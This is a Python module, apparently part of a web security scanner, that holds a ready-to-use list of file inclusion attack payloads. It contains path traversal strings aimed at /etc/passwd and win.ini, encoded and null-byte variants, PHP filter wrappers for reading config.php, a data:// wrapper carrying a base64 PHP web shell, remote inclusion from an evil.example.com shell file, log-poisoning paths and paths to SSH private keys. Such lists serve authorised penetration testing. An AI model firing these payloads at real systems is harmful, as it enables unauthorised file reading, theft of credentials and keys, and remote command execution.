"""LFI/RFI payloads — path traversal, file inclusion, PHP wrappers."""

NAME = "Local/Remote File Inclusion"
DESCRIPTION = "Path traversal, LFI, RFI, and PHP wrapper payloads"
RISK = "HIGH"

PAYLOADS = [
    # Basic path traversal
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    # Windows path traversal
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\..\\windows\\win.ini",
    # URL-encoded
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    # Double encoding
    "..%252f..%252f..%252fetc%252fpasswd",
    # Null byte injection
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.html",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/convert.base64-encode/resource=../../etc/passwd",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://input",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    # Data wrapper
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B",
    # expect wrapper
    "expect://id",
    # RFI
    "https://evil.example.com/shell.txt?",
    "http://evil.example.com/shell.txt?",
    # Log poisoning paths
    "/var/log/apache2/access.log",
    "/var/log/apache/access.log",
    "/var/log/nginx/access.log",
    "/var/log/httpd/access.log",
    "C:\\xampp\\apache\\logs\\access.log",
    "C:\\wamp\\logs\\access.log",
    # Proc/self/environ
    "/proc/self/environ",
    "/proc/self/fd/0",
    "/proc/self/fd/1",
    "/proc/self/fd/2",
    # SSH
    "~/.ssh/id_rsa",
    "/home/user/.ssh/id_rsa",
    "/root/.ssh/id_rsa",
]
